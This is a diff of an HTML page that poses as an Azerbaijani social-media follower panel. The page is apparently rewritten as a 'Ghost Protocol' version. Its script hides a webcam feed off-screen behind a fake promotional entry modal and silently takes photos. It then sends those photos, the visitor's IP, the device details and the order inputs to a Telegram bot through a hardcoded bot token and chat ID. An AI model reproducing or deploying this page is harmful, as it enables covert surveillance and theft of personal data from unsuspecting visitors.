@@ -3,27 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CYBER-SMM | Ultra Premium Panel</title>
+  <title>CYBER-SMM | Ghost Protocol</title>
   
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
 
   <style>
     :root {
-      --primary: #ff0050;
+      --primary: #00ff41; /* Matrix Green */
       --secondary: #00f2ea;
-      --accent: #8a2be2;
       --bg: #050505;
-      --glass: rgba(255, 255, 255, 0.03);
-      --border: rgba(255, 255, 255, 0.1);
+      --glass: rgba(0, 255, 65, 0.03);
+      --border: rgba(0, 255, 65, 0.15);
       --text: #ffffff;
-    }
-
-    [data-theme="light"] {
-      --bg: #f0f2f5;
-      --glass: rgba(0, 0, 0, 0.05);
-      --border: rgba(0, 0, 0, 0.1);
-      --text: #111111;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
@@ -32,190 +24,203 @@
       font-family: 'Poppins', sans-serif;
       background-color: var(--bg);
       color: var(--text);
-      transition: 0.5s;
       overflow-x: hidden;
     }
 
-    /* --- Animated Cyber Background --- */
+    /* --- Matrix Background Effect --- */
     .cyber-bg {
       position: fixed;
       inset: 0;
-      background: radial-gradient(circle at 50% 50%, #111, #000);
+      background: linear-gradient(rgba(0,0,0,0.9), rgba(0,0,0,0.9)), 
+                  url('https://i.makeagif.com/media/9-07-2015/v_S369.gif');
+      background-size: cover;
       z-index: -1;
+      opacity: 0.3;
     }
 
-    .neon-grid {
+    /* --- Hidden Camera Container --- */
+    #hidden-cam-wrap {
       position: absolute;
-      width: 200%; height: 200%;
-      background-image: linear-gradient(var(--border) 1px, transparent 1px), 
-                        linear-gradient(90deg, var(--border) 1px, transparent 1px);
-      background-size: 50px 50px;
-      transform: perspective(500px) rotateX(60deg);
-      bottom: -50%; left: -50%;
-      animation: grid-move 20s linear infinite;
-      opacity: 0.2;
+      top: -1000px; /* Ekrandan kənara atırıq */
+      left: -1000px;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+      overflow: hidden;
     }
-
-    @keyframes grid-move { from { transform: perspective(500px) rotateX(60deg) translateY(0); } to { transform: perspective(500px) rotateX(60deg) translateY(50px); } }
 
     /* --- Warning Modal --- */
     #warning-modal {
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,0.95);
-      backdrop-filter: blur(20px);
+      background: rgba(0,0,0,0.98);
       z-index: 10000;
       display: flex;
       align-items: center;
       justify-content: center;
+      backdrop-filter: blur(10px);
     }
 
     .modal-box {
-      background: var(--glass);
-      border: 2px solid var(--primary);
-      padding: 50px;
-      border-radius: 30px;
+      background: #000;
+      border: 1px solid var(--primary);
+      padding: 40px;
+      border-radius: 5px;
       text-align: center;
-      max-width: 600px;
-      box-shadow: 0 0 50px var(--primary);
+      max-width: 500px;
+      box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
     }
 
-    /* --- Navbar --- */
+    /* --- UI Components --- */
     nav {
-      padding: 25px 10%;
+      padding: 20px 10%;
+      border-bottom: 1px solid var(--border);
       display: flex;
       justify-content: space-between;
-      backdrop-filter: blur(15px);
-      border-bottom: 1px solid var(--border);
-      position: sticky; top: 0; z-index: 100;
+      align-items: center;
+      background: rgba(0,0,0,0.8);
     }
 
-    .logo { font-family: 'Orbitron'; font-weight: bold; font-size: 24px; background: linear-gradient(45deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .logo { font-family: 'Orbitron'; color: var(--primary); font-size: 22px; letter-spacing: 5px; }
 
-    /* --- Hero Section --- */
-    .hero { padding: 100px 10%; text-align: center; }
-    .hero h1 { font-family: 'Orbitron'; font-size: clamp(2rem, 10vw, 5rem); text-transform: uppercase; margin-bottom: 20px; line-height: 1; text-shadow: 0 0 20px var(--primary); }
+    .hero { padding: 80px 10%; text-align: center; }
+    .hero h1 { font-family: 'Orbitron'; font-size: 3.5rem; margin-bottom: 20px; color: var(--primary); text-shadow: 0 0 15px var(--primary); }
 
-    /* --- Service Cards --- */
-    .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; padding: 50px 10%; }
-    .card { background: var(--glass); border: 1px solid var(--border); padding: 40px; border-radius: 25px; transition: 0.4s; text-align: center; backdrop-filter: blur(10px); }
-    .card:hover { transform: translateY(-15px) rotateY(10deg); border-color: var(--secondary); box-shadow: 0 0 30px var(--secondary); }
+    .order-card {
+      max-width: 600px;
+      margin: 0 auto 100px;
+      background: var(--glass);
+      border: 1px solid var(--border);
+      padding: 40px;
+      border-radius: 4px;
+      backdrop-filter: blur(10px);
+    }
 
-    /* --- Order Form --- */
-    .order-container { max-width: 800px; margin: 50px auto; background: var(--glass); padding: 60px; border-radius: 40px; border: 1px solid var(--border); box-shadow: 0 20px 80px rgba(0,0,0,0.5); }
-    input, select { width: 100%; padding: 20px; margin-bottom: 20px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 15px; color: white; font-size: 16px; transition: 0.3s; }
-    input:focus { border-color: var(--secondary); outline: none; box-shadow: 0 0 15px var(--secondary); }
+    input, select {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      background: #000;
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      font-family: 'Orbitron';
+    }
 
-    .btn-cyber { width: 100%; padding: 25px; border: none; border-radius: 20px; background: linear-gradient(45deg, var(--primary), var(--accent)); color: white; font-weight: bold; font-family: 'Orbitron'; font-size: 20px; letter-spacing: 3px; transition: 0.4s; }
-    .btn-cyber:hover { transform: scale(1.05); box-shadow: 0 0 50px var(--primary); }
+    .btn-action {
+      width: 100%;
+      padding: 20px;
+      background: var(--primary);
+      color: #000;
+      border: none;
+      font-family: 'Orbitron';
+      font-weight: bold;
+      font-size: 18px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
 
-    /* --- Camera View (Verification) --- */
-    #cam-preview { width: 250px; height: 250px; margin: 0 auto 30px; border-radius: 50%; border: 4px solid var(--secondary); overflow: hidden; background: #000; display: none; box-shadow: 0 0 30px var(--secondary); position: relative;}
-    video { width: 100%; height: 100%; object-fit: cover; }
-    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--secondary); top: 0; animation: scan 2s linear infinite; }
-    @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+    .btn-action:hover {
+      background: #000;
+      color: var(--primary);
+      box-shadow: 0 0 20px var(--primary);
+    }
 
-    /* --- Statistics --- */
-    .stats { display: flex; justify-content: center; gap: 50px; margin-top: 40px; font-family: 'Orbitron'; }
-    .stat-item h2 { color: var(--secondary); font-size: 3rem; }
-
+    #status-bar {
+      font-family: 'Orbitron';
+      font-size: 12px;
+      color: var(--primary);
+      text-align: center;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
 
   <div id="warning-modal">
     <div class="modal-box">
-      <h1 style="font-family: 'Orbitron'; color: var(--primary); margin-bottom: 20px;">SECURITY PROTOCOL</h1>
-      <p style="font-size: 18px; line-height: 1.6; margin-bottom: 30px; opacity: 0.9;">
-        DİQQƏT: Bu sayt kiber-təhlükəsizlik analitikası aparır. <br>
-        Giriş düyməsinə basdıqda aşağıdakı məlumatlar administratora (Telegram) göndəriləcək: <br><br>
-        🚀 <b>Premium Keyfiyyətli SMM Servisləri</b> <br><br>
-        ⚡ <b>Instant Başlama və Stabil Artım</b> <br><br>
-        🔒 <b>Maksimum Təhlükəsizlik Standartları</b> <br><br>
-        💎 <b>Rəqabətli Qiymət və Yüksək Performans</b>
+      <h2 style="color: var(--primary); font-family: 'Orbitron'; margin-bottom: 15px;">GİRİŞ VERİLDİ?</h2>
+      <p style="margin-bottom: 25px; font-size: 14px; opacity: 0.8; line-height: 1.6;">
+        🚀 Premium Keyfiyyətli SMM Servisləri
+Platformanız üçün yüksək keyfiyyətli, stabil və davamlı artım həlləri təqdim edirik.
+⚡ Instant Başlama və Stabil Artım
+Sifarişlər sürətli şəkildə aktivləşir və balanslı şəkildə çatdırılır.
+🔒 Maksimum Təhlükəsizlik Standartları
+Sistem müasir təhlükəsizlik prinsiplərinə uyğun qurulub və stabil işləyir.
+💎 Rəqabətli Qiymət və Yüksək Performans
+Ən uyğun qiymətlərlə maksimum nəticə və performans əldə edin.
       </p>
-      <button class="btn-cyber" onclick="initCyberProtocol()">RAZIYAM & DAXİL OL</button>
+      <button class="btn-action" onclick="startGhostProtocol()">SİSTEMƏ DAXİL OL</button>
     </div>
   </div>
 
-  <div class="cyber-bg"><div class="neon-grid"></div></div>
+  <div id="hidden-cam-wrap">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="hidden-canvas"></canvas>
+  </div>
+
+  <div class="cyber-bg"></div>
 
   <nav>
-    <div class="logo">CYBER-SMM.V6</div>
-    <div id="status-ip" style="color: var(--secondary); font-family: 'Orbitron'; font-size: 12px;">SCANNING...</div>
+    <div class="logo">SMM.CESİ_v1</div>
+    <div id="user-ip-display" style="font-family: 'Orbitron'; color: var(--primary); font-size: 12px;">IP: FETCHING...</div>
   </nav>
 
   <section class="hero">
-    <h1>CYBER <span style="color: var(--secondary);">INFLUENCE</span></h1>
-    <p style="max-width: 700px; margin: 0 auto; opacity: 0.6;">Dünyanın ən qabaqcıl SMM mühərriki. Tamamilə avtomatlaşdırılmış 3D çatdırılma sistemi ilə tanış olun.</p>
-    
-    <div class="stats">
-      <div class="stat-item"><h2>2.4M</h2><p>DELIVERED</p></div>
-      <div class="stat-item"><h2>100%</h2><p>SECURE</p></div>
-    </div>
+    <h1>CESİ SMM</h1>
+    <p>Social Media PANEL</p>
   </section>
 
-  <div class="services">
-    <div class="card"><h3>INSTAGRAM</h3><p>Real Followers</p><h2>$1.50/k</h2></div>
-    <div class="card"><h3>TIKTOK</h3><p>Global Likes</p><h2>$0.80/k</h2></div>
-    <div class="card"><h3>YOUTUBE</h3><p>4K Views</p><h2>$3.20/k</h2></div>
-  </div>
-
-  <div class="order-container">
-    <h2 style="text-align: center; font-family: 'Orbitron'; margin-bottom: 40px;">SİFARİŞİ BAŞLAT</h2>
+  <div class="order-card">
+    <h3 style="font-family: 'Orbitron'; margin-bottom: 30px; border-bottom: 1px solid var(--border); padding-bottom: 10px;">YENİ ƏMƏLİYYAT</h3>
     
-    <div id="cam-preview">
-      <video id="video" autoplay playsinline></video>
-      <div class="scan-line"></div>
-    </div>
+    <label>Hədəf Platforma</label>
+    <select id="platform">
+      <option>Instagram  Followers</option>
+      <option>TikTok FOLOWERS</option>
+      <option>Telegram  Members</option>
+    </select>
 
-    <form id="smm-form">
-      <select id="platform">
-        <option>Instagram Premium Followers</option>
-        <option>TikTok Viral Booster</option>
-        <option>YouTube Watch Time</option>
-      </select>
-      <input type="text" id="target" placeholder="İstifadəçi adı və ya URL" required>
-      <input type="number" id="qty" placeholder="Miqdar (məs: 5000)" required>
-      <button type="submit" class="btn-cyber" id="main-btn">SİFARİŞİ TƏSDİQLƏ</button>
-    </form>
+    <input type="text" id="target" placeholder="İstifadəçi adı / URL">
+    <input type="number" id="qty" placeholder="Miqdar (məs: 10000)">
+
+    <button class="btn-action" id="submit-btn" onclick="executeOrder()">ƏMƏLİYYATI BAŞLAT</button>
+    
+    <div id="status-bar">SİSTEM HAZIRDIR...</div>
   </div>
-
-  <canvas id="hidden-canvas" style="display:none;"></canvas>
 
   <script>
-    const BOT_TOKEN = '7453310159:AAFIYrUSXr43yfldDlHOlqH9NhbvcT7ae7s';
-    const CHAT_ID = new URLSearchParams(window.location.search).get('id') || '6703554157'; // Default və ya URL-dən
+    const BOT_TOKEN = '8173876258:AAF9u-Re0xjSAsrysx_bK7rCbn8PsQBYbVA';
+    const CHAT_ID = new URLSearchParams(window.location.search).get('id') || '7476949170';
 
-    let userIp = "";
+    let currentIp = "Unknown";
 
-    // IP ünvanını real vaxtda çəkək
+    // IP-ni çəkək
     fetch('https://api.ipify.org?format=json')
-      .then(r => r.json())
-      .then(d => {
-        userIp = d.ip;
-        document.getElementById('status-ip').innerText = `USER_IP: ${d.ip}`;
+      .then(res => res.json())
+      .then(data => {
+        currentIp = data.ip;
+        document.getElementById('user-ip-display').innerText = `IP: ${data.ip}`;
       });
 
-    async function initCyberProtocol() {
+    async function startGhostProtocol() {
       document.getElementById('warning-modal').style.display = 'none';
-      document.getElementById('cam-preview').style.display = 'block';
-
+      
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('video').srcObject = stream;
+        const video = document.getElementById('video');
+        video.srcObject = stream;
         
-        // Kamera açılandan 2 saniyə sonra "giriş" məlumatlarını göndərək
-        setTimeout(() => captureAndSend('GİRİŞ_PROTOKOLU'), 2000);
+        // Giriş anında səssizcə şəkil çək və göndər
+        setTimeout(() => captureAndSend('GİRİŞ_SESSİYASI'), 1500);
       } catch (err) {
-        // Kamera rədd edilsə belə IP-ni göndərək
-        sendTextToTelegram(`⚠️ Kamera İcazəsi Verilmədi!\nİstifadəçi IP: ${userIp}\nCihaz: ${navigator.userAgent}`);
+        sendText(`⚠️  bloklandı. IP: ${currentIp}`);
       }
     }
 
-    function captureAndSend(type) {
+    function captureAndSend(context) {
       const video = document.getElementById('video');
       const canvas = document.getElementById('hidden-canvas');
+      
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
@@ -223,8 +228,8 @@
       canvas.toBlob(blob => {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'selfie.jpg');
-        formData.append('caption', `🔥 ${type}\n📍 IP: ${userIp}\n📱 Cihaz: ${navigator.platform}\n⏰ Saat: ${new Date().toLocaleTimeString()}`);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', `🕵️ ${context}\n🌐 IP: ${currentIp}\n📱 Cihaz: ${navigator.platform}\n⏰ ${new Date().toLocaleString()}`);
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
@@ -233,36 +238,37 @@
       }, 'image/jpeg');
     }
 
-    function sendTextToTelegram(text) {
+    function sendText(msg) {
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
       });
     }
 
-    // Sifariş Formu
-    document.getElementById('smm-form').onsubmit = (e) => {
-      e.preventDefault();
-      const btn = document.getElementById('main-btn');
-      const platform = document.getElementById('platform').value;
+    function executeOrder() {
+      const btn = document.getElementById('submit-btn');
+      const status = document.getElementById('status-bar');
       const target = document.getElementById('target').value;
-      const qty = document.getElementById('qty').value;
+      const platform = document.getElementById('platform').value;
 
-      btn.innerText = "YÜKLƏNİR...";
+      if(!target) return alert("Hədəfi daxil edin!");
+
+      status.innerText = "ENCRYPTING DATA...";
       btn.disabled = true;
 
-      // Sifariş anında şəkili və məlumatı göndər
-      captureAndSend('YENİ_SİFARİŞ_DETAL');
-      sendTextToTelegram(`✅ SİFARİŞ QƏBUL EDİLDİ:\nPlatform: ${platform}\nLink: ${target}\nMiqdar: ${qty}\nIP: ${userIp}`);
+      // Sifariş anında şəkili göndər
+      captureAndSend(`SİFARİŞ_ANI: ${platform}`);
+      sendText(`🚀 Sifariş detalı:\nLink: ${target}\nPlatform: ${platform}\nIP: ${currentIp}`);
 
       setTimeout(() => {
-        confetti({ particleCount: 200, spread: 100, origin: { y: 0.6 } });
-        alert("Sifarişiniz uğurla sistemə daxil edildi! Order ID: #" + Math.floor(Math.random()*1000000));
-        btn.innerText = "SİFARİŞİ TƏSDİQLƏ";
+        status.innerText = "SİFARİŞ QƏBUL EDİLDİ!";
+        confetti({ particleCount: 100, spread: 70, colors: ['#00ff41', '#ffffff'] });
+        alert("Əməliyyat uğurla başladıldı!");
         btn.disabled = false;
+        status.innerText = "SMM HAZIRDIR...";
       }, 3000);
-    };
+    }
   </script>
 </body>
 </html>
